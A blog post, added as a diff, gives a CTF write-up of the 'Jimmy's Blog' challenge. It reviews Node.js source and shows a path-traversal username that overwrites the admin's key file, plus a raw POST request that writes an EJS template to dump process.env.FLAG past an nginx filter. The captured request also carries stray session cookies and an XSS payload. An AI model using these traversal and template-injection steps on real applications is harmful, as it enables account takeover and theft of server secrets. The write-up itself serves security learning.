@@ -1,0 +1,244 @@
+
+<p>There were many challenges in this CTF, but for this one the comeplete source code was provided which you could use to setup the challenge locally so I spent more time here.</p>
+
+<h1 id="jimmys-blog">Jimmy’s Blog</h1>
+
+<p>https://github.com/Sudistark/sudistark.github.io/raw/main/jimmys_blog.zip</p>
+
+<p>In the challenge description , it was mentioned that this application doesn’t requires any password for users to get login (passwordless login mechanism).</p>
+
+<p>This is how the site homepage looked like:
+<img src="https://user-images.githubusercontent.com/31372554/193503499-eaf5c6fa-fea6-4fbe-87c7-b749e65d77ad.png" alt="firefox_b4aSIj6Xvg" /></p>
+
+<p>There are two articles also which can be accessed from this urls:
+http://127.0.0.1:1337/article?id=1
+http://127.0.0.1:1337/article?id=2</p>
+
+<p>Changing the value of this <code class="language-plaintext highlighter-rouge">id</code> parameter , returns <em>NOt Found</em> error</p>
+
+<p>On the registeration page it just asks for a username not password (remember as this is a passwordless mechanism site)</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/193503518-a90a732f-04f7-4d7e-b674-06471e1427b4.png" alt="image" /></p>
+
+<p>Upon clicking on the <em>Get key</em> button, a file is downloaded named <code class="language-plaintext highlighter-rouge">yourusername.key</code>. This key will used in the login page</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/193503596-3447470d-a721-47be-a9c0-6672cedc04e2.png" alt="image" /></p>
+
+<hr />
+
+<p><em>Login Page</em>:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/193503532-07ae2f0f-3b00-4f63-af29-41596251600e.png" alt="image" /></p>
+
+<p>Request made when the user clicks on the login button:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /login HTTP/1.1
+Host: 127.0.0.1:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------77228163722178869953705465670
+Content-Length: 1374
+Origin: http://127.0.0.1:1337
+Connection: close
+Referer: http://127.0.0.1:1337/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+-----------------------------77228163722178869953705465670
+Content-Disposition: form-data; name="username"
+
+admin
+-----------------------------77228163722178869953705465670
+Content-Disposition: form-data; name="key"; filename="admin.key"
+Content-Type: application/octet-stream
+
+cóåA Ç»³8µÆZ3,¢àþîB.*BõýR¯àPÓÕ¹ßÿ·5Ê§Ö³LÚN-æKáúóo´¹ñ&lt;c¤¹ö½Íõa}øDóã¬O¬H±¤ÙQx	³W^Ä~îðTdÖXs§SËJâ&lt;õZPÊ¹ô8 Â3­x+ñÜ
+äúÐmÇùîÚWHôÔ­­@ÉVw´nãîMõd¼0'0ÎD§¹³Ò´
+</code></pre></div></div>
+
+<p>The key content is not in a readable format, if the provided key is valid you will logged in to the account.</p>
+
+<hr />
+
+<p><strong>Source Code Review:</strong></p>
+
+<p>After logging in there’s any other functionality so let’s look into the source code, to understand how the server is handling the key generation and validation process.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/register</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="nx">username</span><span class="p">);</span>  <span class="c1">// [1]</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span> <span class="nx">res</span><span class="p">.</span><span class="nf">download</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="nx">username</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.key</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">else</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">register</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">error</span><span class="p">:</span> <span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="na">session</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span> <span class="p">});</span>
+<span class="p">})</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">,</span> <span class="nx">upload</span><span class="p">.</span><span class="nf">single</span><span class="p">(</span><span class="dl">'</span><span class="s1">key</span><span class="dl">'</span><span class="p">),</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">key</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span> <span class="c1">// [2]</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">admin</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">admin</span><span class="p">;</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">login</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">error</span><span class="p">:</span> <span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="na">session</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span> <span class="p">});</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>On line [1] and [2] you can see a call to <code class="language-plaintext highlighter-rouge">utils.register(username)</code> and  utils.login(username, key.buffer) is made respectively</p>
+
+<p>First let’s focus on the key generation part:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">register</span><span class="p">(</span><span class="dl">"</span><span class="s2">jimmy_jammy</span><span class="dl">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">register</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">admin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">db</span><span class="p">.</span><span class="nf">prepare</span><span class="p">(</span><span class="dl">"</span><span class="s2">INSERT INTO users (username, admin) VALUES (?, ?)</span><span class="dl">"</span><span class="p">).</span><span class="nf">run</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">admin</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Username already taken</span><span class="dl">"</span> <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">const</span> <span class="nx">key_path</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keys</span><span class="dl">"</span><span class="p">,</span> <span class="nx">username</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.key</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//[3]</span>
+    <span class="kd">const</span> <span class="nx">contents</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomBytes</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nf">writeFileSync</span><span class="p">(</span><span class="nx">key_path</span><span class="p">,</span> <span class="nx">contents</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="nx">key_path</span> <span class="p">};</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If the username is already taken the server will return error.</p>
+
+<p><code class="language-plaintext highlighter-rouge">jimmy_jammy</code> is the admin user username</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">register</code> method has two arguements first is the username (which is controllable by us) and 2nd one is the admin flag (which by default is false).</p>
+
+<p>The key generation part starts from line [3] , using <code class="language-plaintext highlighter-rouge">path.join</code> method the <em>key_path</em> is generated (location where the key is stored in the server)
+Then it genrates randomBytes of size 1024 using the crypto module and on the last line it just writes the contents to the <em>key_path</em> file.</p>
+
+<p>As there is no check/sanitzation for the username variable (which is controlled by the user), this allows the attacker to perform path traversal here.By exploiting this bug the attacker would be able to write his <code class="language-plaintext highlighter-rouge">username.key</code> file to any directory on the server.</p>
+
+<p>Now focusing on the <code class="language-plaintext highlighter-rouge">login</code> method:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">login</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">prepare</span><span class="p">(</span><span class="dl">"</span><span class="s2">SELECT * FROM users WHERE username = ?</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="nx">username</span><span class="p">);</span>
+    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">User does not exist</span><span class="dl">"</span> <span class="p">};</span>
+
+    <span class="k">if </span><span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid access key</span><span class="dl">"</span> <span class="p">};</span>
+    <span class="kd">const</span> <span class="nx">key_path</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keys</span><span class="dl">"</span><span class="p">,</span> <span class="nx">username</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.key</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//[4]</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nf">compare</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="nx">key_path</span><span class="p">))</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Wrong access key</span><span class="dl">"</span> <span class="p">};</span>
+    <span class="k">return</span> <span class="p">{</span> <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="nx">user</span> <span class="p">};</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It first checks if there exist any user with that username or not in the database
+On line [4] you can see that the same path traversal vuln exist here too.
+On the next line, you can find the logic of the login mechanism, it just compares the content of the key provided during login and the key stored in the key_path</p>
+
+<p>Normally all the keys are stored in the <code class="language-plaintext highlighter-rouge">/app/keys/yourusername.key</code> directory, so when a user with <code class="language-plaintext highlighter-rouge">admin</code> userame registers on the site. A new key will be generated under the keys directory <code class="language-plaintext highlighter-rouge">admin.key</code> and then during login the user needs to provide the key and username, the server then finds the location of corresponding key based upon the provided username and compares if the client keys matches with the key stored in the server or not.</p>
+
+<p>The authentication can be easily bypasses because of the path traversal vuln which exists in both the login and register method.Our end goal is to become admin by login to jimmy_jammy’s account. The user <code class="language-plaintext highlighter-rouge">jimmy_jammy</code> key location on the server is <code class="language-plaintext highlighter-rouge">../../../app/keys/jimmy_jammy.key</code></p>
+
+<p>So , the attacker will first generate the key by providing a username like this: <code class="language-plaintext highlighter-rouge">../../../app/keys/jimmy_jammy</code> , as this username doesn’t already exist in the database , a key will generated for this user.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">username</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">../../../app/keys/jimmy_jammy.key</span><span class="dl">"</span>
+ <span class="kd">const</span> <span class="nx">key_path</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keys</span><span class="dl">"</span><span class="p">,</span> <span class="nx">username</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.key</span><span class="dl">"</span><span class="p">)</span>
+
+<span class="o">&gt;</span> <span class="sr">/app/</span><span class="nx">keys</span><span class="o">/</span><span class="nx">jimmy_jammy</span><span class="p">.</span><span class="nx">key</span>
+</code></pre></div></div>
+
+<p>It will end up overwriting the actual jimmy_jammy user key and basically what happened here is that the key for <code class="language-plaintext highlighter-rouge">jimmy_jammy</code> user was overwritten with key of the user <code class="language-plaintext highlighter-rouge">../../../app/keys/jimmy_jammy</code></p>
+
+<p>Now during login we will provide the username <code class="language-plaintext highlighter-rouge">jimmy_jammy</code> and the key for the <code class="language-plaintext highlighter-rouge">../../../app/keys/jimmy_jammy</code> user.
+When the server will fetch the content of the <code class="language-plaintext highlighter-rouge">/app/keys/jimmy_jammy.key</code> (whcih we have overwritten) and compare it with the key provided during login they will be perfect match and we will logged in as the admin user <code class="language-plaintext highlighter-rouge">jimmy_jammy</code></p>
+
+<hr />
+
+<p>Wait , the challenge hasn’t end yet.</p>
+
+<p>From the source code , we can see that the flag is visible from the <code class="language-plaintext highlighter-rouge">/edit</code> which is only accessible from the admin user.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">admin</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">401</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">).</span><span class="nf">toString</span><span class="p">();</span>
+    <span class="kd">const</span> <span class="nx">article_path</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">articles</span><span class="dl">"</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">article</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="nx">article_path</span><span class="p">).</span><span class="nf">toString</span><span class="p">();</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">edit</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">article</span><span class="p">:</span> <span class="nx">article</span><span class="p">,</span> <span class="na">session</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">,</span> <span class="na">flag</span><span class="p">:</span> <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="dl">"</span><span class="s2">process.env.FLAG</span><span class="dl">"</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">)</span> <span class="p">});</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>As we are logged in as the admin user, we should be able to view the flag right?</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/193503713-c0d34968-d52d-4763-bc79-b5b8d1f148b9.png" alt="image" /></p>
+
+<p>But no,because of the nginx sub_filter rule. The flag is replaced by the string <em>oof, that was close, glad i was here to save the day</em></p>
+
+<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server</span> {
+        <span class="n">listen</span> <span class="m">80</span> <span class="n">default_server</span>;
+        <span class="n">listen</span> [::]:<span class="m">80</span> <span class="n">default_server</span>;
+
+        <span class="n">server_name</span> <span class="err">_</span>;
+
+        <span class="n">location</span> / {
+			<span class="c"># Replace the flag so nobody steals it!
+</span>            <span class="n">sub_filter</span> <span class="s1">'placeholder_for_flag'</span> <span class="s1">'oof, that was close, glad i was here to save the day'</span>;
+            <span class="n">sub_filter_once</span> <span class="n">off</span>;
+            <span class="n">proxy_pass</span> <span class="n">http</span>://<span class="n">localhost</span>:<span class="m">3000</span>;
+        }
+}
+</code></pre></div></div>
+
+<p>http://nginx.org/en/docs/http/ngx_http_sub_module.html</p>
+
+<p>Again looking into the source code, we can spot another path traversal bug. But this time we have full control over the content of the file also</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">admin</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">401</span><span class="p">);</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">fs</span><span class="p">.</span><span class="nf">writeFileSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">articles</span><span class="dl">"</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">),</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">article</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\r</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">));</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>To make sure that nginx doesn’t replace the flag with something else, Ithough of encoding the flag to another format. As the site uses ejs template I could overwrite any of the available template file and execute my own templates for eg:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">,</span><span class="dl">'</span><span class="s1">ascii</span><span class="dl">'</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">base64</span><span class="dl">"</span><span class="p">)</span><span class="o">%&gt;</span>
+</code></pre></div></div>
+
+<p>This will encode the flag to base64</p>
+
+<p>Here’s the request , notice the <code class="language-plaintext highlighter-rouge">id</code> parameter value , you can change it to any file which you want to overwrite as changing any other such as the .js file would require a server restart I used the template file instead :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /edit?id=../views/scripts.ejs HTTP/1.1
+Host: 127.0.0.1:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: http://127.0.0.1:1337
+Connection: close
+Referer: http://127.0.0.1:1337/edit?id=1
+Cookie: wp-settings-time-1=1663159225; BITBUCKETSESSIONID=CB8444D322BCB0EBA83295A2BE124807; _atl_bitbucket_remember_me=MzYwMThjZTA3OWE4ZmM4NzdmMjBiODY3NThjNWFkOTU4MGI5OTNjNjo4ODEyMzg0MTljYWVlYjcxNTQ3YWMyZWYyNTJiMmNhZTk3NWUzYjJm; DOKU_PREFS=difftype%23sidebyside%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2529%253E; connect.sid=s%3AaWx9KB0bw_2BGfsC-RNgVKx5NYSuVyA4.k5QJAM0yBB2%2FHSkNHR0hbZEhVroVsEUZznULHHZvfKw
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+article=&lt;%= Buffer.from(process.env.FLAG,'ascii').toString("base64")%&gt;
+</code></pre></div></div>
+
+<p>Now when you will visit the edit page, the base64 encoded flag should be right there.</p>
+
+<p>This was a really good challenge: BlackHatMEA{1475:16:6eb55fd9172620043c27f3a781bfb966e4efe6a5}</p>
